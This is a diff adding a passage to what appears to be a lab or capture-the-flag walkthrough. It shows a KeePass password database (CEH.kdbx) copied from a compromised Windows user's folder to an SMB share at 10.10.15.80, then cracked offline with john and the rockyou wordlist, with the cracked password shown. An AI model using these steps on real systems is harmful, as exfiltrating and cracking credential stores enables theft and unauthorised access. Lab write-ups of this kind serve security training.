@@ -201,6 +201,29 @@ C:\Users\kohsuke\Documents\CEH.kdbx
 
 ```
 
+```
+C:\Users\kohsuke\Documents>copy CEH.kdbx \\10.10.15.80\share\CEH.kdbx
+copy CEH.kdbx \\10.10.15.80\share\CEH.kdbx
+        1 file(s) copied.
+
+```
+
+```
+john --format=keepass --wordlist=/usr/share/wordlists/rockyou.txt CEH.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 6000 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+moonshine1       (CEH)     
+1g 0:00:00:20 DONE (2026-09-14 16:47) 0.04980g/s 2737p/s 2737c/s 2737C/s nando1..moonshine1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+                          
+```
+
 
 ---
 ## Privilege Escalation
